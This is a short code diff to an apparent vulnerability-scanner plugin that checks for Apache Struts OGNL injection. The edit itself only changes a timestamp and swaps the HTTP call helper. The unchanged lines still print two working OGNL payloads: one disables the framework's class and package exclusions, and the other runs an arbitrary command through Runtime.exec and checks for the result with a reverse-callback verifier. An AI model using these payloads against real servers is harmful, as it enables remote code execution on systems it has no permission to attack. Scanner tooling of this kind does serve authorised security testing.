@@ -3,7 +3,7 @@
 '''
 Date: 2022-03-22 10:33:13
 LastEditors: recar
-LastEditTime: 2022-03-23 18:14:57
+LastEditTime: 2022-03-24 14:23:42
 '''
 
 from plugins.poc.base import PocBase
@@ -23,7 +23,7 @@ class Poc(PocBase):
         data = {
                 "id": "%{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}"
             }
-        self.post(self.base_url, data=data, timeout=3)
+        self.request(self.base_url, 'POST' ,data=data)
 
     def verify(self):
         self.reverse = Reverse()
@@ -31,7 +31,7 @@ class Poc(PocBase):
         data = {
             "id": "%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('"+cmd+"'))}"
         }
-        self.post(self.base_url, data=data,timeout=3)        
+        self.request(self.base_url, 'POST' ,data=data)        
         if self.reverse.verify():
             return True, data
         return False, None
